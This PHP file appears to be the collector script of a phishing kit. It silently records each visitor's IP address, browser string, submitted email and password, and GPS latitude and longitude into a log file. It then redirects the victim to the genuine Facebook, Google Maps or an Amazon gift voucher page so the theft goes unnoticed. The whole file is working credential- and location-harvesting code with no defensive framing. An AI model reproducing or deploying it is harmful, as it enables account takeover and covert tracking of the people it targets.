<?php
header('Content-Type: application/json');

$data = [
    'time' => date('Y-m-d H:i:s'),
    'ip' => $_SERVER['REMOTE_ADDR'],
    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
    'email' => $_POST['email'] ?? null,
    'password' => $_POST['password'] ?? null,
    'lat' => $_GET['lat'] ?? null,
    'lon' => $_GET['lon'] ?? null,
    'status' => $_GET['status'] ?? 'page_loaded',
    'page' => basename(dirname($_SERVER['HTTP_REFERER'] ?? ''))
];

file_put_contents('logs.txt', json_encode($data) . "\n", FILE_APPEND);

// Natural redirects
switch ($data['page']) {
    case 'facebook':
        header("Location: https://facebook.com");
        break;
    case 'google':
        header("Location: https://maps.google.com");
        break;
    case 'festival':
        if ($data['status'] === 'location_granted') {
            header("Location: https://www.amazon.in/gift-voucher");
        }
        break;
    default:
        header("Location: https://google.com");
}
exit();
?>